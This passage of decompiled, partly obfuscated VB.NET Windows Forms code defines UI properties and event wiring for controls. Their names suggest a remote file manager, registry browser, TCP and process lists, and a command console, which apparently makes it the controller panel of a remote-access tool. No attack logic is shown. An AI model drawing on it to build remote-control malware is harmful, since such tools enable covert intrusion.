			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DownloadToolStripMenuItem_Click
				Dim flag As Boolean = Me._DownloadToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._DownloadToolStripMenuItem.Click, value2
				End If
				Me._DownloadToolStripMenuItem = value
				flag = (Me._DownloadToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._DownloadToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000140 RID: 320
		' (get) Token: 0x0600035A RID: 858 RVA: 0x00165550 File Offset: 0x00163950
		' (set) Token: 0x0600035B RID: 859 RVA: 0x00165568 File Offset: 0x00163968
		Friend Overridable Property UploadToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UploadToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UploadToolStripMenuItem_Click
				Dim flag As Boolean = Me._UploadToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._UploadToolStripMenuItem.Click, value2
				End If
				Me._UploadToolStripMenuItem = value
				flag = (Me._UploadToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._UploadToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000141 RID: 321
		' (get) Token: 0x0600035C RID: 860 RVA: 0x001655C8 File Offset: 0x001639C8
		' (set) Token: 0x0600035D RID: 861 RVA: 0x001655E0 File Offset: 0x001639E0
		Friend Overridable Property NewEmptyFileToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._NewEmptyFileToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewEmptyFileToolStripMenuItem_Click
				Dim flag As Boolean = Me._NewEmptyFileToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._NewEmptyFileToolStripMenuItem.Click, value2
				End If
				Me._NewEmptyFileToolStripMenuItem = value
				flag = (Me._NewEmptyFileToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._NewEmptyFileToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000142 RID: 322
		' (get) Token: 0x0600035E RID: 862 RVA: 0x00165640 File Offset: 0x00163A40
		' (set) Token: 0x0600035F RID: 863 RVA: 0x00165658 File Offset: 0x00163A58
		Friend Overridable Property NewFolderToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._NewFolderToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewFolderToolStripMenuItem_Click
				Dim flag As Boolean = Me._NewFolderToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._NewFolderToolStripMenuItem.Click, value2
				End If
				Me._NewFolderToolStripMenuItem = value
				flag = (Me._NewFolderToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._NewFolderToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000143 RID: 323
		' (get) Token: 0x06000360 RID: 864 RVA: 0x001656B8 File Offset: 0x00163AB8
		' (set) Token: 0x06000361 RID: 865 RVA: 0x001656D0 File Offset: 0x00163AD0
		Friend Overridable Property OpenDownloadsToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenDownloadsToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenDownloadsToolStripMenuItem_Click
				Dim flag As Boolean = Me._OpenDownloadsToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._OpenDownloadsToolStripMenuItem.Click, value2
				End If
				Me._OpenDownloadsToolStripMenuItem = value
				flag = (Me._OpenDownloadsToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._OpenDownloadsToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000144 RID: 324
		' (get) Token: 0x06000362 RID: 866 RVA: 0x00165730 File Offset: 0x00163B30
		' (set) Token: 0x06000363 RID: 867 RVA: 0x00165748 File Offset: 0x00163B48
		Friend Overridable Property RarToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RarToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RarToolStripMenuItem_Click
				Dim flag As Boolean = Me._RarToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._RarToolStripMenuItem.Click, value2
				End If
				Me._RarToolStripMenuItem = value
				flag = (Me._RarToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._RarToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000145 RID: 325
		' (get) Token: 0x06000364 RID: 868 RVA: 0x001657A8 File Offset: 0x00163BA8
		' (set) Token: 0x06000365 RID: 869 RVA: 0x001657C0 File Offset: 0x00163BC0
		Friend Overridable Property UnRarToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UnRarToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UnRarToolStripMenuItem_Click
				Dim flag As Boolean = Me._UnRarToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._UnRarToolStripMenuItem.Click, value2
				End If
				Me._UnRarToolStripMenuItem = value
				flag = (Me._UnRarToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._UnRarToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000146 RID: 326
		' (get) Token: 0x06000366 RID: 870 RVA: 0x00165820 File Offset: 0x00163C20
		' (set) Token: 0x06000367 RID: 871 RVA: 0x00165838 File Offset: 0x00163C38
		Friend Overridable Property UploadFromLinkToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UploadFromLinkToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UploadFromLinkToolStripMenuItem_Click
				Dim flag As Boolean = Me._UploadFromLinkToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._UploadFromLinkToolStripMenuItem.Click, value2
				End If
				Me._UploadFromLinkToolStripMenuItem = value
				flag = (Me._UploadFromLinkToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._UploadFromLinkToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000147 RID: 327
		' (get) Token: 0x06000368 RID: 872 RVA: 0x00165898 File Offset: 0x00163C98
		' (set) Token: 0x06000369 RID: 873 RVA: 0x001658B0 File Offset: 0x00163CB0
		Friend Overridable Property ContextMenuStrip4 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip4 = value
			End Set
		End Property

		' Token: 0x17000148 RID: 328
		' (get) Token: 0x0600036A RID: 874 RVA: 0x001658BC File Offset: 0x00163CBC
		' (set) Token: 0x0600036B RID: 875 RVA: 0x001658D4 File Offset: 0x00163CD4
		Friend Overridable Property RefreshToolStripMenuItem3 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem3_Click
				Dim flag As Boolean = Me._RefreshToolStripMenuItem3 IsNot Nothing
				If flag Then
					RemoveHandler Me._RefreshToolStripMenuItem3.Click, value2
				End If
				Me._RefreshToolStripMenuItem3 = value
				flag = (Me._RefreshToolStripMenuItem3 IsNot Nothing)
				If flag Then
					AddHandler Me._RefreshToolStripMenuItem3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000149 RID: 329
		' (get) Token: 0x0600036C RID: 876 RVA: 0x00165934 File Offset: 0x00163D34
		' (set) Token: 0x0600036D RID: 877 RVA: 0x0016594C File Offset: 0x00163D4C
		Friend Overridable Property MG As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._MG
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._MG = value
			End Set
		End Property

		' Token: 0x1700014A RID: 330
		' (get) Token: 0x0600036E RID: 878 RVA: 0x00165958 File Offset: 0x00163D58
		' (set) Token: 0x0600036F RID: 879 RVA: 0x00165970 File Offset: 0x00163D70
		Friend Overridable Property ListView1 As ListView
			<DebuggerNonUserCode()>
			Get
				Return Me._ListView1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ListView)
				Dim value2 As EventHandler = AddressOf Me.ListView1_SelectedIndexChanged
				Dim flag As Boolean = Me._ListView1 IsNot Nothing
				If flag Then
					RemoveHandler Me._ListView1.SelectedIndexChanged, value2
				End If
				Me._ListView1 = value
				flag = (Me._ListView1 IsNot Nothing)
				If flag Then
					AddHandler Me._ListView1.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700014B RID: 331
		' (get) Token: 0x06000370 RID: 880 RVA: 0x001659D0 File Offset: 0x00163DD0
		' (set) Token: 0x06000371 RID: 881 RVA: 0x001659E8 File Offset: 0x00163DE8
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x1700014C RID: 332
		' (get) Token: 0x06000372 RID: 882 RVA: 0x001659F4 File Offset: 0x00163DF4
		' (set) Token: 0x06000373 RID: 883 RVA: 0x00165A0C File Offset: 0x00163E0C
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x1700014D RID: 333
		' (get) Token: 0x06000374 RID: 884 RVA: 0x00165A18 File Offset: 0x00163E18
		' (set) Token: 0x06000375 RID: 885 RVA: 0x00165A30 File Offset: 0x00163E30
		Friend Overridable Property vmethod_148 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_148
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._vmethod_148 = value
			End Set
		End Property

		' Token: 0x1700014E RID: 334
		' (get) Token: 0x06000376 RID: 886 RVA: 0x00165A3C File Offset: 0x00163E3C
		' (set) Token: 0x06000377 RID: 887 RVA: 0x00165A54 File Offset: 0x00163E54
		Friend Overridable Property Timer1 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Me._Timer1 = value
			End Set
		End Property

		' Token: 0x1700014F RID: 335
		' (get) Token: 0x06000378 RID: 888 RVA: 0x00165A60 File Offset: 0x00163E60
		' (set) Token: 0x06000379 RID: 889 RVA: 0x00165A78 File Offset: 0x00163E78
		Friend Overridable Property FMM As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._FMM
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._FMM = value
			End Set
		End Property

		' Token: 0x17000150 RID: 336
		' (get) Token: 0x0600037A RID: 890 RVA: 0x00165A84 File Offset: 0x00163E84
		' (set) Token: 0x0600037B RID: 891 RVA: 0x00165A9C File Offset: 0x00163E9C
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x17000151 RID: 337
		' (get) Token: 0x0600037C RID: 892 RVA: 0x00165AA8 File Offset: 0x00163EA8
		' (set) Token: 0x0600037D RID: 893 RVA: 0x00165AC0 File Offset: 0x00163EC0
		Friend Overridable Property L1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._L1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L1_DoubleClick1
				Dim flag As Boolean = Me._L1 IsNot Nothing
				If flag Then
					RemoveHandler Me._L1.DoubleClick, value2
				End If
				Me._L1 = value
				flag = (Me._L1 IsNot Nothing)
				If flag Then
					AddHandler Me._L1.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x17000152 RID: 338
		' (get) Token: 0x0600037E RID: 894 RVA: 0x00165B20 File Offset: 0x00163F20
		' (set) Token: 0x0600037F RID: 895 RVA: 0x00165B38 File Offset: 0x00163F38
		Friend Overridable Property ColumnHeader6 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader6 = value
			End Set
		End Property

		' Token: 0x17000153 RID: 339
		' (get) Token: 0x06000380 RID: 896 RVA: 0x00165B44 File Offset: 0x00163F44
		' (set) Token: 0x06000381 RID: 897 RVA: 0x00165B5C File Offset: 0x00163F5C
		Friend Overridable Property ColumnHeader7 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader7 = value
			End Set
		End Property

		' Token: 0x17000154 RID: 340
		' (get) Token: 0x06000382 RID: 898 RVA: 0x00165B68 File Offset: 0x00163F68
		' (set) Token: 0x06000383 RID: 899 RVA: 0x00165B80 File Offset: 0x00163F80
		Friend Overridable Property p As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._p
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._p = value
			End Set
		End Property

		' Token: 0x17000155 RID: 341
		' (get) Token: 0x06000384 RID: 900 RVA: 0x00165B8C File Offset: 0x00163F8C
		' (set) Token: 0x06000385 RID: 901 RVA: 0x00165BA4 File Offset: 0x00163FA4
		Friend Overridable Property L2 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._L2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L2_SelectedIndexChanged
				Dim value3 As EventHandler = AddressOf Me.L2_DoubleClick
				Dim flag As Boolean = Me._L2 IsNot Nothing
				If flag Then
					RemoveHandler Me._L2.SelectedIndexChanged, value2
					RemoveHandler Me._L2.DoubleClick, value3
				End If
				Me._L2 = value
				flag = (Me._L2 IsNot Nothing)
				If flag Then
					AddHandler Me._L2.SelectedIndexChanged, value2
					AddHandler Me._L2.DoubleClick, value3
				End If
			End Set
		End Property

		' Token: 0x17000156 RID: 342
		' (get) Token: 0x06000386 RID: 902 RVA: 0x00165C2C File Offset: 0x0016402C
		' (set) Token: 0x06000387 RID: 903 RVA: 0x00165C44 File Offset: 0x00164044
		Friend Overridable Property ColumnHeader8 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader8 = value
			End Set
		End Property

		' Token: 0x17000157 RID: 343
		' (get) Token: 0x06000388 RID: 904 RVA: 0x00165C50 File Offset: 0x00164050
		' (set) Token: 0x06000389 RID: 905 RVA: 0x00165C68 File Offset: 0x00164068
		Friend Overridable Property ColumnHeader9 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader9 = value
			End Set
		End Property

		' Token: 0x17000158 RID: 344
		' (get) Token: 0x0600038A RID: 906 RVA: 0x00165C74 File Offset: 0x00164074
		' (set) Token: 0x0600038B RID: 907 RVA: 0x00165C8C File Offset: 0x0016408C
		Friend Overridable Property ColumnHeader10 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader10
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader10 = value
			End Set
		End Property

		' Token: 0x17000159 RID: 345
		' (get) Token: 0x0600038C RID: 908 RVA: 0x00165C98 File Offset: 0x00164098
		' (set) Token: 0x0600038D RID: 909 RVA: 0x00165CB0 File Offset: 0x001640B0
		Friend Overridable Property LTCP As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._LTCP
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._LTCP = value
			End Set
		End Property

		' Token: 0x1700015A RID: 346
		' (get) Token: 0x0600038E RID: 910 RVA: 0x00165CBC File Offset: 0x001640BC
		' (set) Token: 0x0600038F RID: 911 RVA: 0x00165CD4 File Offset: 0x001640D4
		Friend Overridable Property ColumnHeader16 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader16
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader16 = value
			End Set
		End Property

		' Token: 0x1700015B RID: 347
		' (get) Token: 0x06000390 RID: 912 RVA: 0x00165CE0 File Offset: 0x001640E0
		' (set) Token: 0x06000391 RID: 913 RVA: 0x00165CF8 File Offset: 0x001640F8
		Friend Overridable Property ColumnHeader17 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader17
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader17 = value
			End Set
		End Property

		' Token: 0x1700015C RID: 348
		' (get) Token: 0x06000392 RID: 914 RVA: 0x00165D04 File Offset: 0x00164104
		' (set) Token: 0x06000393 RID: 915 RVA: 0x00165D1C File Offset: 0x0016411C
		Friend Overridable Property ColumnHeader18 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader18
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader18 = value
			End Set
		End Property

		' Token: 0x1700015D RID: 349
		' (get) Token: 0x06000394 RID: 916 RVA: 0x00165D28 File Offset: 0x00164128
		' (set) Token: 0x06000395 RID: 917 RVA: 0x00165D40 File Offset: 0x00164140
		Friend Overridable Property ColumnHeader19 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader19
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader19 = value
			End Set
		End Property

		' Token: 0x1700015E RID: 350
		' (get) Token: 0x06000396 RID: 918 RVA: 0x00165D4C File Offset: 0x0016414C
		' (set) Token: 0x06000397 RID: 919 RVA: 0x00165D64 File Offset: 0x00164164
		Friend Overridable Property ColumnHeader20 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader20
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader20 = value
			End Set
		End Property

		' Token: 0x1700015F RID: 351
		' (get) Token: 0x06000398 RID: 920 RVA: 0x00165D70 File Offset: 0x00164170
		' (set) Token: 0x06000399 RID: 921 RVA: 0x00165D88 File Offset: 0x00164188
		Friend Overridable Property ColumnHeader21 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader21
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader21 = value
			End Set
		End Property

		' Token: 0x17000160 RID: 352
		' (get) Token: 0x0600039A RID: 922 RVA: 0x00165D94 File Offset: 0x00164194
		' (set) Token: 0x0600039B RID: 923 RVA: 0x00165DAC File Offset: 0x001641AC
		Friend Overridable Property RG As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._RG
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._RG = value
			End Set
		End Property

		' Token: 0x17000161 RID: 353
		' (get) Token: 0x0600039C RID: 924 RVA: 0x00165DB8 File Offset: 0x001641B8
		' (set) Token: 0x0600039D RID: 925 RVA: 0x00165DD0 File Offset: 0x001641D0
		Friend Overridable Property RGLIST As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._RGLIST
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.RGLIST_DoubleClick
				Dim flag As Boolean = Me._RGLIST IsNot Nothing
				If flag Then
					RemoveHandler Me._RGLIST.DoubleClick, value2
				End If
				Me._RGLIST = value
				flag = (Me._RGLIST IsNot Nothing)
				If flag Then
					AddHandler Me._RGLIST.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x17000162 RID: 354
		' (get) Token: 0x0600039E RID: 926 RVA: 0x00165E30 File Offset: 0x00164230
		' (set) Token: 0x0600039F RID: 927 RVA: 0x00165E48 File Offset: 0x00164248
		Friend Overridable Property ColumnHeader3 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader3 = value
			End Set
		End Property

		' Token: 0x17000163 RID: 355
		' (get) Token: 0x060003A0 RID: 928 RVA: 0x00165E54 File Offset: 0x00164254
		' (set) Token: 0x060003A1 RID: 929 RVA: 0x00165E6C File Offset: 0x0016426C
		Friend Overridable Property ColumnHeader4 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader4 = value
			End Set
		End Property

		' Token: 0x17000164 RID: 356
		' (get) Token: 0x060003A2 RID: 930 RVA: 0x00165E78 File Offset: 0x00164278
		' (set) Token: 0x060003A3 RID: 931 RVA: 0x00165E90 File Offset: 0x00164290
		Friend Overridable Property ColumnHeader5 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader5 = value
			End Set
		End Property

		' Token: 0x17000165 RID: 357
		' (get) Token: 0x060003A4 RID: 932 RVA: 0x00165E9C File Offset: 0x0016429C
		' (set) Token: 0x060003A5 RID: 933 RVA: 0x00165EB4 File Offset: 0x001642B4
		Friend Overridable Property RGk As TreeView
			<DebuggerNonUserCode()>
			Get
				Return Me._RGk
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TreeView)
				Dim value2 As TreeNodeMouseClickEventHandler = AddressOf Me.RGk_NodeMouseClick
				Dim value3 As TreeViewEventHandler = AddressOf Me.RGk_AfterSelect
				Dim value4 As TreeViewEventHandler = AddressOf Me.RGk_AfterExpand
				Dim value5 As TreeViewEventHandler = AddressOf Me.RGk_AfterCollapse
				Dim flag As Boolean = Me._RGk IsNot Nothing
				If flag Then
					RemoveHandler Me._RGk.NodeMouseDoubleClick, value2
					RemoveHandler Me._RGk.AfterSelect, value3
					RemoveHandler Me._RGk.AfterExpand, value4
					RemoveHandler Me._RGk.AfterCollapse, value5
				End If
				Me._RGk = value
				flag = (Me._RGk IsNot Nothing)
				If flag Then
					AddHandler Me._RGk.NodeMouseDoubleClick, value2
					AddHandler Me._RGk.AfterSelect, value3
					AddHandler Me._RGk.AfterExpand, value4
					AddHandler Me._RGk.AfterCollapse, value5
				End If
			End Set
		End Property

		' Token: 0x17000166 RID: 358
		' (get) Token: 0x060003A6 RID: 934 RVA: 0x00165F90 File Offset: 0x00164390
		' (set) Token: 0x060003A7 RID: 935 RVA: 0x00165FA8 File Offset: 0x001643A8
		Friend Overridable Property sh As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._sh
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Dim value2 As EventHandler = AddressOf Me.sh_Resize
				Dim flag As Boolean = Me._sh IsNot Nothing
				If flag Then
					RemoveHandler Me._sh.Resize, value2
				End If
				Me._sh = value
				flag = (Me._sh IsNot Nothing)
				If flag Then
					AddHandler Me._sh.Resize, value2
				End If
			End Set
		End Property

		' Token: 0x17000167 RID: 359
		' (get) Token: 0x060003A8 RID: 936 RVA: 0x00166008 File Offset: 0x00164408
		' (set) Token: 0x060003A9 RID: 937 RVA: 0x00166020 File Offset: 0x00164420
		Friend Overridable Property T1 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Me._T1 = value
			End Set
		End Property

		' Token: 0x17000168 RID: 360
		' (get) Token: 0x060003AA RID: 938 RVA: 0x0016602C File Offset: 0x0016442C
		' (set) Token: 0x060003AB RID: 939 RVA: 0x00166044 File Offset: 0x00164444
		Friend Overridable Property T2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.T2_KeyDown
				Dim flag As Boolean = Me._T2 IsNot Nothing
				If flag Then
					RemoveHandler Me._T2.KeyDown, value2
				End If
				Me._T2 = value
				flag = (Me._T2 IsNot Nothing)
				If flag Then
					AddHandler Me._T2.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x17000169 RID: 361
		' (get) Token: 0x060003AC RID: 940 RVA: 0x001660A4 File Offset: 0x001644A4
		' (set) Token: 0x060003AD RID: 941 RVA: 0x001660BC File Offset: 0x001644BC
		Friend Overridable Property LPR As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._LPR
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._LPR = value
			End Set
		End Property

		' Token: 0x1700016A RID: 362
		' (get) Token: 0x060003AE RID: 942 RVA: 0x001660C8 File Offset: 0x001644C8
		' (set) Token: 0x060003AF RID: 943 RVA: 0x001660E0 File Offset: 0x001644E0
		Friend Overridable Property ColumnHeader22 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader22
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader22 = value
			End Set
		End Property

		' Token: 0x1700016B RID: 363
		' (get) Token: 0x060003B0 RID: 944 RVA: 0x001660EC File Offset: 0x001644EC
		' (set) Token: 0x060003B1 RID: 945 RVA: 0x00166104 File Offset: 0x00164504
		Friend Overridable Property ColumnHeader23 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader23
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader23 = value
			End Set
		End Property

		' Token: 0x1700016C RID: 364
		' (get) Token: 0x060003B2 RID: 946 RVA: 0x00166110 File Offset: 0x00164510
		' (set) Token: 0x060003B3 RID: 947 RVA: 0x00166128 File Offset: 0x00164528
		Friend Overridable Property ColumnHeader24 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader24
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader24 = value
			End Set
		End Property

		' Token: 0x1700016D RID: 365
		' (get) Token: 0x060003B4 RID: 948 RVA: 0x00166134 File Offset: 0x00164534
		' (set) Token: 0x060003B5 RID: 949 RVA: 0x0016614C File Offset: 0x0016454C
		Friend Overridable Property ColumnHeader25 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
